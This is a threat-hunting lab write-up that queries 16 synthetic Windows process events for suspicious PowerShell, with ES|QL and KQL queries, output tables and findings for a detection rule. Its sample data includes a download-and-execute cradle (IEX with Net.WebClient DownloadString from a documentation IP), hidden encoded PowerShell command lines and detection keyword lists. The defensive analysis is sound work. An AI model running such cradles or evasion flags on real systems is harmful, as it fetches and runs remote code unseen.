# H001: Suspicious PowerShell process creation

| | |
|---|---|
| **Data** | `data/synthetic/process_creation_events.json` (16 synthetic events, 15 Jan 2026, 08:01–09:05 UTC) |
| **Labels used?** | No. The hunt only reads the events file |
| **Run it** | `python -m threathunt_lab hunt` (code: [`hunt.py`](../src/threathunt_lab/hunt.py)) |
| **Result** | Activity worth following up on 3 hosts. Nothing confirmed as malicious |

## 1. Hypothesis

> Attackers may start PowerShell with a command line that **hides the code**
> (an encoded command) or that **downloads code and runs it in memory**, often
> from an **unusual parent program** such as Word or Excel. If that happened
> here, the process-creation events should show it.

This doesn't mean every encoded PowerShell command is an attack. Admins and
management tools use the same features.

**ATT&CK context:** T1059.001 (PowerShell), T1027.010 (Command Obfuscation),
T1105 (Ingress Tool Transfer), T1204.002 (Malicious File), T1036.003 (Rename
Legitimate Utilities).

## 2. Data and fields

Each event is one process start (`event.category: process`,
`event.type: start`). In a real network this data would come from Sysmon
Event ID 1, Windows Security Event ID 4688 (only with command-line logging
turned on) or Elastic Defend.

| Field | Used for |
|---|---|
| `process.name`, `process.executable` | Finding PowerShell, and programs in unusual folders |
| `process.command_line` | Encoded commands, hidden windows, downloads |
| `process.parent.name`, `process.parent.command_line` | What started PowerShell |
| `host.name`, `user.name`, `@timestamp` | Counting and timelines |

**Watch out:** in Elastic, KQL matches `keyword` and `wildcard` fields
**case-sensitively**, so `POWERSHELL.EXE` and `powershell.exe` are different
values.

## 3. How to reproduce

```bash
.venv/bin/python -m threathunt_lab hunt               # all steps
.venv/bin/python -m threathunt_lab hunt --step Q4     # one step
```

All the output below is copied from that command, and a test checks it still
matches.

The Elastic queries (KQL and ES|QL) were checked against Elastic's
documentation but **not run on a real cluster**. Before using them:

- Change `logs-*` to the index with your process events.
- ES|QL uses `:` for `event.category` and `event.type` because they're lists,
  and `==` on a list returns null. `:` needs Elastic 9.1 or newer.
- `LIKE` with a list of patterns needs a recent version. Otherwise use several
  `LIKE`s joined with `OR`.

## 4. Investigation

### Q1: Baseline (know the data)

First, get an overview: how many events, over what time, from which hosts.

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| STATS events = COUNT(*), first_seen = MIN(@timestamp), last_seen = MAX(@timestamp) BY host.name
| SORT events ASC, host.name ASC
```

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| STATS events = COUNT(*) BY process.name
| SORT events ASC, process.name ASC
```

```text
-- Dataset summary
metric                 value
---------------------  ------------------------
events                 16
first @timestamp       2026-01-15T08:01:12.000Z
last @timestamp        2026-01-15T09:05:20.000Z
distinct host.name     4
distinct user.name     6
distinct process.name  9
```

**Notes**
- 16 events from 4 hosts in about an hour. That's far too little data to say
  what's "normal". A real baseline would cover days or weeks.

### Q2: Find PowerShell

Find every PowerShell start: `powershell.exe`, `pwsh.exe` (PowerShell 7) and
`powershell_ise.exe`.

KQL is case-sensitive, so the query has to list both spellings:

```kql
event.category : "process" and event.type : "start" and process.name : ("powershell.exe" or "pwsh.exe" or "powershell_ise.exe" or "POWERSHELL.EXE" or "PWSH.EXE" or "POWERSHELL_ISE.EXE")
```

ES|QL can lower-case the name first, which covers every spelling:

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| WHERE TO_LOWER(process.name) IN ("powershell.exe", "pwsh.exe", "powershell_ise.exe")
| KEEP @timestamp, event.id, host.name, user.name, process.name
| SORT @timestamp ASC
```

```text
-- Exact-case vs case-insensitive name match
match                                                            events
---------------------------------------------------------------  ------
exact case, lower-case names only (like KQL on a keyword field)  10
case-insensitive                                                 11
```

**Notes**
- 11 of the 16 events are PowerShell, on all 4 hosts. Using PowerShell is
  normal, so this isn't a finding by itself.
- A case-sensitive search finds only 10. It misses `thl-evt-0012`
  (`POWERSHELL.EXE`). **Lesson: always check whether your search ignores case.**

### Q3: What started PowerShell? (stacking)

Count the parent programs and show the rarest first. Common parents
(Explorer, the Task Scheduler) are expected; rare ones deserve a closer look.

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| WHERE TO_LOWER(process.name) IN ("powershell.exe", "pwsh.exe", "powershell_ise.exe")
| STATS events = COUNT(*) BY process.parent.name
| SORT events ASC, process.parent.name ASC
```

```text
-- PowerShell parents (rarest first)
process.parent.name  count
-------------------  -----
Code.exe             1
EXCEL.EXE            1
WINWORD.EXE          1
deployagent.exe      1
cmd.exe              2
svchost.exe          2
explorer.exe         3
```

**Notes**
- **`WINWORD.EXE` (`thl-evt-0009`)**: Word opened `invoice_0423.docm` from
  the Downloads folder. A `.docm` file can contain macros, and a downloaded
  "invoice" is a common phishing trick. **Follow up.**
- **`EXCEL.EXE` (`thl-evt-0013`)**: Excel starting PowerShell 7 is also
  unusual. Same user and host as 0009. **Follow up.**
- **`cmd.exe` (`thl-evt-0010`)**: started from a batch file in the user's Temp
  folder. Installers do this too, so Q4 checks what it ran.
- **`deployagent.exe` (`thl-evt-0011`)**: a management tool running as
  `svc_deploy`. Probably automation.
- VS Code, Explorer and the Task Scheduler are normal parents.

### Q4: What's in the command lines?

Look for the signs from the hypothesis: encoding (`-enc`), hidden window,
execution policy bypass, downloads and `IEX` (run text as code).

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| WHERE TO_LOWER(process.name) IN ("powershell.exe", "pwsh.exe", "powershell_ise.exe")
| EVAL cmd = TO_LOWER(process.command_line)
| EVAL encoded_command = cmd LIKE "*-enc*",
       hidden_window = cmd LIKE "*hidden*",
       no_profile = cmd LIKE "*-nop*",
       policy_bypass = cmd LIKE "*bypass*",
       download = cmd LIKE ("*downloadstring*", "*downloadfile*", "*net.webclient*", "*invoke-webrequest*", "*start-bitstransfer*"),
       invoke_expression = cmd LIKE ("*iex*", "*invoke-expression*")
| KEEP @timestamp, event.id, host.name, process.parent.name, encoded_command, hidden_window, no_profile, policy_bypass, download, invoke_expression, process.command_line
| SORT @timestamp ASC
```

A simple KQL version, to compare:

```kql
event.category : "process" and event.type : "start" and process.name : ("powershell.exe" or "pwsh.exe" or "POWERSHELL.EXE") and process.command_line : (*-enc* or *-Enc* or *-ENC* or *-EncodedCommand*)
```

```text
-- Feature counts across PowerShell starts
feature            searched for                                                                            events  event.id values
-----------------  --------------------------------------------------------------------------------------  ------  ----------------------------------------------------------------------------------
encoded_command    -enc                                                                                    5       thl-evt-0008, thl-evt-0009, thl-evt-0011, thl-evt-0012, thl-evt-0013
hidden_window      hidden                                                                                  3       thl-evt-0009, thl-evt-0012, thl-evt-0015
no_profile         -nop                                                                                    6       thl-evt-0006, thl-evt-0008, thl-evt-0009, thl-evt-0011, thl-evt-0012, thl-evt-0015
policy_bypass      bypass                                                                                  1       thl-evt-0010
download           downloadstring | downloadfile | net.webclient | invoke-webrequest | start-bitstransfer  1       thl-evt-0010
invoke_expression  iex | invoke-expression                                                                 1       thl-evt-0010
```

```text
-- Command lines for manual review
event.id      process.command_line
------------  -----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
thl-evt-0004  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
thl-evt-0005  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoLogo
thl-evt-0006  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -ExecutionPolicy RemoteSigned -File "C:\Scripts\Get-DiskReport.ps1"
thl-evt-0008  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Command "Get-Content C:\Reports\q4-encryption-audit.txt"
thl-evt-0009  powershell.exe -nop -w hidden -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQAaAByAGUAYQB0AEgAdQBuAHQAIABMAGEAYgAgAHMAeQBuAHQAaABlAHQAaQBjACAAZQB2AGUAbgB0ACAALQAgAGkAbgBlAHIAdAAnAA==
thl-evt-0010  powershell.exe -ExecutionPolicy Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.23/update.ps1')"
thl-evt-0011  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -NonInteractive -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQAaAByAGUAYQB0AEgAdQBuAHQAIABMAGEAYgAgAHMAeQBuAHQAaABlAHQAaQBjACAAYQBkAG0AaQBuACAAdABhAHMAawAgAC0AIABpAG4AZQByAHQAJwA=
thl-evt-0012  POWERSHELL.EXE -NoP -W Hidden -eNc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAGkAbgBlAHIAdAAnAA==
thl-evt-0013  "C:\Program Files\PowerShell\7\pwsh.exe" -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAnAFQAaAByAGUAYQB0AEgAdQBuAHQAIABMAGEAYgAgAHMAeQBuAHQAaABlAHQAaQBjACAAcAB3AHMAaAAgAGUAdgBlAG4AdAAgAC0AIABpAG4AZQByAHQAJwA=
thl-evt-0014  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe"
thl-evt-0015  C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -WindowStyle Hidden -File C:\Scripts\Rotate-Logs.ps1
```

```text
-- Encoded-command search: case-sensitive KQL query vs case-insensitive
event.id      KQL match  case-insensitive match
------------  ---------  ----------------------
thl-evt-0008  yes        yes
thl-evt-0009  yes        yes
thl-evt-0011  yes        yes
thl-evt-0012  NO         yes
thl-evt-0013  yes        yes
```

**Notes.** I read every command line myself. The counts only point at what to read.
- **`thl-evt-0008` is a false match.** `-enc` is only part of the file name
  `q4-encryption-audit.txt`. **Lesson: a plain text search can't tell a
  parameter from text inside a file name.**
- **`thl-evt-0012` is missed by the KQL query** because it's written `-eNc`.
  PowerShell ignores case, so attackers can write it any way they like.
- **`thl-evt-0010`** is a classic "download and run": bypass the execution
  policy, download a script from an IP address, run it with `IEX`. What the
  script did isn't visible in this data. (`198.51.100.23` is a documentation
  address.) **Follow up.**
- **`thl-evt-0009` and `thl-evt-0012`** combine `-nop`, a hidden window and
  an encoded command, which together try to stay out of the user's sight.
  **Follow up.**
- **`-NoProfile` alone means little.** 6 events use it, mostly normal
  automation.
- **`thl-evt-0015`** has a hidden window, but it's a scheduled task running a
  named script on disk as `SYSTEM`. Probably normal.

### Q5: Look beyond the process name

Q2–Q4 trust the process name, but anyone can rename a file. This step looks
for PowerShell-style arguments on programs **not** named PowerShell, and
counts which folders programs run from.

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| WHERE TO_LOWER(process.name) NOT IN ("powershell.exe", "pwsh.exe", "powershell_ise.exe")
| EVAL cmd = TO_LOWER(process.command_line)
| WHERE cmd LIKE ("*-enc*", "*hidden*", "*-nop*", "*bypass*", "*downloadstring*", "*downloadfile*", "*net.webclient*", "*invoke-webrequest*", "*start-bitstransfer*", "*iex*", "*invoke-expression*")
| KEEP @timestamp, event.id, host.name, process.name, process.executable, process.command_line
```

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| EVAL directory = REPLACE(TO_LOWER(process.executable), """\\[^\\]*$""", "")
| STATS events = COUNT(*) BY directory
| SORT events ASC, directory ASC
```

```text
-- Non-PowerShell processes with PowerShell-style arguments
event.id      host.name  process.name   process.executable             features
------------  ---------  -------------  -----------------------------  ------------------------------------------
thl-evt-0016  WKS-HR-03  svcupdate.exe  C:\Users\Public\svcupdate.exe  encoded_command, hidden_window, no_profile
```

```text
-- Executable directories, all events (rarest first)
directory                                          count
-------------------------------------------------  -----
c:\program files (x86)\microsoft\edge\application  1
c:\program files\powershell\7                      1
c:\users\public                                    1
c:\windows\system32                                3
c:\windows\system32\windowspowershell\v1.0         10
```

**Notes**
- **`thl-evt-0016`**: `svcupdate.exe` runs from `C:\Users\Public`, a folder
  every user can write to, with exactly PowerShell's arguments
  (`-nop -w hidden -enc`). **Most likely a renamed copy of PowerShell**, but
  that can't be confirmed: the data has no original file name
  (`process.pe.original_file_name`) and no hash. **Follow up.**
- Q2–Q4 missed this event completely. **Lesson: a hunt that only checks the
  process name can be fooled by renaming the file.**

### Q6: Decode the encoded commands

PowerShell's `-EncodedCommand` is Base64 of UTF-16LE text. This step finds
long Base64 strings and decodes them **as text only, never run**. (ES|QL's
`FROM_BASE64` expects UTF-8, so the decoding is done locally.)

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start"
| WHERE process.command_line RLIKE """.*[A-Za-z0-9+/]{20,}={0,2}.*"""
| KEEP @timestamp, event.id, host.name, process.name, process.command_line
```

```text
-- Decoded Base64 candidates (text only, never executed)
event.id      process.name    blob length  decoded text
------------  --------------  -----------  ----------------------------------------------------------
thl-evt-0009  powershell.exe  144          Write-Output 'ThreatHunt Lab synthetic event - inert'
thl-evt-0011  powershell.exe  156          Write-Output 'ThreatHunt Lab synthetic admin task - inert'
thl-evt-0012  POWERSHELL.EXE  56           Write-Output 'inert'
thl-evt-0013  pwsh.exe        156          Write-Output 'ThreatHunt Lab synthetic pwsh event - inert'
thl-evt-0016  svcupdate.exe   56           Write-Output 'inert'
```

**Notes**
- All five decode to harmless `Write-Output` text, because the dataset was
  built to be safe.
- **A harmless payload doesn't close the case.** For `thl-evt-0009`, the
  question is still *why a downloaded macro document started hidden
  PowerShell*. Attackers sometimes test with harmless commands.

### Q7: Timeline per host

Put each host's events in time order, so related activity shows up together.

```kql
host.name : "WKS-HR-03" and event.category : "process" and event.type : "start"
```

```esql
FROM logs-*
| WHERE event.category : "process" AND event.type : "start" AND host.name == "WKS-HR-03"
| KEEP @timestamp, event.id, user.name, process.parent.name, process.name, process.command_line
| SORT @timestamp ASC
```

```text
-- Timeline for WKS-FIN-01
@timestamp                event.id      user.name   parent -> process              features
------------------------  ------------  ----------  -----------------------------  ------------------------------------------
2026-01-15T08:01:12.000Z  thl-evt-0001  user.fin01  explorer.exe -> notepad.exe    -
2026-01-15T08:03:45.000Z  thl-evt-0002  user.fin01  explorer.exe -> msedge.exe     -
2026-01-15T08:30:05.000Z  thl-evt-0009  user.fin01  WINWORD.EXE -> powershell.exe  encoded_command, hidden_window, no_profile
2026-01-15T08:50:12.000Z  thl-evt-0013  user.fin01  EXCEL.EXE -> pwsh.exe          encoded_command
```

```text
-- Timeline for WKS-HR-03
@timestamp                event.id      user.name  parent -> process                   features
------------------------  ------------  ---------  ----------------------------------  ------------------------------------------
2026-01-15T08:22:40.000Z  thl-evt-0008  user.hr03  explorer.exe -> powershell.exe      encoded_command, no_profile
2026-01-15T08:31:10.000Z  thl-evt-0010  user.hr03  cmd.exe -> powershell.exe           policy_bypass, download, invoke_expression
2026-01-15T08:55:00.000Z  thl-evt-0014  user.hr03  explorer.exe -> powershell_ise.exe  -
2026-01-15T09:05:20.000Z  thl-evt-0016  user.hr03  cmd.exe -> svcupdate.exe            encoded_command, hidden_window, no_profile
```

**Notes**
- **WKS-FIN-01:** Word and then Excel both start encoded PowerShell, 20
  minutes apart, for the same user. Two unusual events are harder to explain
  away than one.
- **WKS-HR-03:** a download at 08:31, then the probably-renamed PowerShell at
  09:05. That *looks* like "download, then run the next step", **but the data
  can't prove they're connected.** There are no process IDs, so the process
  tree can't be rebuilt, and the two `cmd.exe` parents had different command
  lines.
- **SRV-APP-01:** every PowerShell start comes from a service or scheduled
  task under a service account. Looks like automation.

## 5. Findings

| Event | Host | What I saw | Assessment |
|---|---|---|---|
| `thl-evt-0009` | WKS-FIN-01 | Word (downloaded `.docm`) starts hidden, encoded PowerShell | **Follow up** |
| `thl-evt-0013` | WKS-FIN-01 | Excel starts encoded PowerShell 7, 20 min later | **Follow up** |
| `thl-evt-0010` | WKS-HR-03 | Batch file in Temp: bypass + download + `IEX` | **Follow up** |
| `thl-evt-0016` | WKS-HR-03 | Probably renamed PowerShell in `C:\Users\Public` | **Follow up** |
| `thl-evt-0012` | WKS-ENG-02 | Hidden, encoded PowerShell from `cmd.exe` | **Follow up** (lower priority) |
| `thl-evt-0011` | SRV-APP-01 | Deployment tool runs `-EncodedCommand` | Probably normal: check with the tool's owners |
| `thl-evt-0015` | SRV-APP-01 | Scheduled task, hidden window, script on disk | Probably normal |
| `thl-evt-0006` | SRV-APP-01 | Scheduled reporting script | Normal |
| `thl-evt-0008` | WKS-HR-03 | `-enc` only inside a file name | Normal (false match) |
| `thl-evt-0004`, `0005`, `0014` | | Interactive PowerShell, VS Code terminal, ISE | Normal |

"Follow up" means the data raises a question it can't answer. It is **not** a
verdict that an attack happened.

## 6. Possible innocent explanations

- **Deployment tools** (`thl-evt-0011`) sometimes pass scripts with
  `-EncodedCommand`. Ask the owners whether job 1187 is real before treating
  it as normal.
- **Scheduled tasks** (`thl-evt-0015`) often hide their window so no console
  pops up.
- **Engineers testing scripts** (`thl-evt-0012`) might run encoded commands.
  Asking the user is a reasonable first step.
- **Installers** (`thl-evt-0010`) sometimes download scripts, but a bare IP
  address plus a Temp batch file plus `IEX` is less typical.

## 7. Limitations

- **Tiny and synthetic.** 16 events I created. "Rare" means nothing with so
  little data.
- **Only process starts.** No PowerShell script logs (Event ID 4104), so I
  can't see what `IEX` ran. No network or file events.
- **No process IDs**, so events can't be linked into a process tree.
- **No original file name or hashes**, so the renamed binary can't be
  confirmed.
- **Simple text matching** can be fooled by obfuscation.
- **The Elastic queries weren't run** on a real cluster.

## 8. Conclusion

**The hypothesis is supported, but nothing is confirmed as malicious.**

- **WKS-FIN-01** and **WKS-HR-03** show exactly the behaviour from the
  hypothesis, with no innocent explanation in the data.
- **WKS-ENG-02** has one unexplained event, possibly an engineer testing.
- **SRV-APP-01** looks like normal automation.

In a real network, the next steps would be:
1. Escalate WKS-FIN-01 and WKS-HR-03.
2. Collect PowerShell script logs, network connections to `198.51.100.23`, the
   `.docm` file, `start.bat`, and the hash of `svcupdate.exe`.
3. Ask the WKS-ENG-02 user about `thl-evt-0012`.
4. Check deployment job 1187 with the tool's owners.

## 9. What this means for the detection (D001)

- Alert on PowerShell with an **encoded-command flag**, matched as a whole
  word (to avoid `q4-encryption`), **ignoring case** (to catch `-eNc`), and
  including short forms like `-e` and `-ec`.
- Include `pwsh.exe` (PowerShell 7).
- Cover **download + `IEX`** too (`thl-evt-0010` has no encoded command).
- Don't alert on `-NoProfile` or a hidden window alone: both are common in
  normal automation.
- A renamed PowerShell needs `process.pe.original_file_name`. Without it the
  rule will miss `thl-evt-0016`.
- Expect alerts from deployment tools like `thl-evt-0011`.

The detection is in [D001](../detections/D001-powershell-encoded-or-download.md).
